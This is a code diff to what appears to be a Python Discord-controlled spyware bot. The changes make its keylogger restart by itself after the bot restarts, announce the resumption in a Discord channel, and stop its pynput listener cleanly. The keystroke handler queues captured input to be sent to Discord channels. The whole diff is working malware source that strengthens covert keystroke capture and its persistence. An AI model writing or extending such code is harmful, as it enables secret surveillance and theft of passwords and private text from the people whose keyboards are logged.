@@ -243,6 +243,16 @@ async def on_ready():
         channel_ids["keylogger_channel"] = keylogger_channel.id
         print(f"Keylogger channel ID set to: {keylogger_channel.id}")
 
+        # Auto-restart keylogger
+        if keylogger_active:
+            global keylogger_thread
+            keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
+            keylogger_thread.start()
+            print("Keylogger auto-restarted from saved status.")
+            await keylogger_channel.send(
+                "\U0001f7e2 **Keylogger resumed after bot restart.**"
+            )
+
         channel_ids["voice"] = VOICE_CHANNEL_ID
 
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -859,6 +869,7 @@ ctrl_codes = {
 }
 keylogger_active = False
 keylogger_thread = None
+keylogger_listener = None
 status_file = os.path.join(temp_dir, "keylogger_status.json")
 
 
@@ -910,6 +921,8 @@ def load_keylogger_status():
 
 # Key press event handler
 def on_press(key):
+    if not keylogger_active:
+        return
     global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
     processed_key = (
         str(key)[1:-1] if (str(key)[0] == "'" and str(key)[-1] == "'") else key
@@ -993,19 +1006,22 @@ def on_press(key):
 
 # Function to start the keylogger
 def start_keylogger():
-    global keylogger_active
+    global keylogger_active, keylogger_listener
     keylogger_active = True
     save_keylogger_status()
     with Listener(on_press=on_press) as listener:
+        keylogger_listener = listener
         listener.join()
+    keylogger_listener = None
 
 
 # Function to stop the keylogger
 def stop_keylogger():
-    global keylogger_active
+    global keylogger_active, keylogger_listener
     keylogger_active = False
     save_keylogger_status()
-    # Stopping the listener automatically
+    if keylogger_listener is not None:
+        keylogger_listener.stop()
 
 
 # Bot command to control the keylogger
